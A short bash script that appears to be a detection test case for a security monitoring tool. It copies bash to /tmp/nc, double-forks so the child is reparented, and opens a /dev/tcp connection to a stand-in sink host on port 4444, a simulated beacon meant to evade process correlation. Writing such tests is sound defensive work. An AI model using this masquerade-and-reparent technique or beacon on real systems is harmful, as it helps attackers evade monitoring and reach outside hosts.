#!/usr/bin/env bash
# T1055.009 (Tier B) — a suspicious parent (bash-as-/tmp/nc) double-forks so the
# acting child is REPARENTED (its original parent exits before it beacons).
# Historically breaks pid-join correlation; P0-1's recently-exited window may
# partially attribute it. Expected miss; a hit is scored GAP_CLOSED.
set -eu
host="${SINK_EXTERNAL:-203.0.113.10}"
port="${SINK_PORT:-4444}"
cp -f "$(command -v bash)" /tmp/nc && chmod +x /tmp/nc
timeout 6 /tmp/nc -c "setsid bash -c 'sleep 1; timeout 3 bash -c \"exec 3<>/dev/tcp/${host}/${port}\" 2>/dev/null' & exit 0" 2>/dev/null || true
sleep 3
